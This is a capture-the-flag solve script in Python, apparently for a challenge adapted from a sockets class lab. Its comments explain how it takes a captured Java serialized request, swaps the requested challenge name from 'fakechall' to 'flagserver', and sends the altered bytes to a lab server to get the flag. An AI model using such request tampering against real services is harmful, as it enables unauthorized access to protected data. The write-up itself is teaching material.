# Code for this challenge was adapted from the "Basic Chat App" 
# lab from BCA's Sockets and Threading class.


# The pcap shows that the server uses Java serialized objects.
# The request object seems to contain a string "fakechall"
# (and if you look a bit closer, the name for that variable, "chall")
# implying that the client requests a specific challenge from the server.
# As such, we must modify the request to ask for "flagserver"
# (since that is this challenge - as mentioned in the desc/hints.)

# We can create our own Java class to send these, but the simplest
# way is to just directly modify the given request.
# A quick google shows that Java serialized objects store strings
# with their length and then their content, so we will need to
# replace "\x09fakechall" with "\x0aflagserver".

from pwn import remote

# given req

req_hex = "aced00057372001e666c61677365727665722e4d65737361676543746f535f52657175657374bd164155d760d5a30200014c00056368616c6c7400124c6a6176612f6c616e672f537472696e673b78720012666c61677365727665722e4d65737361676590d21cc718e89c16020000787074000966616b656368616c6c"

req = bytes.fromhex(req_hex)

req = req.replace(b"\x09fakechall", b"\x0aflagserver")

# use the real IP and port on the real chall
r = remote("172.17.0.2", 54323)

r.sendline(req)

print(r.recvall()) # contains the flag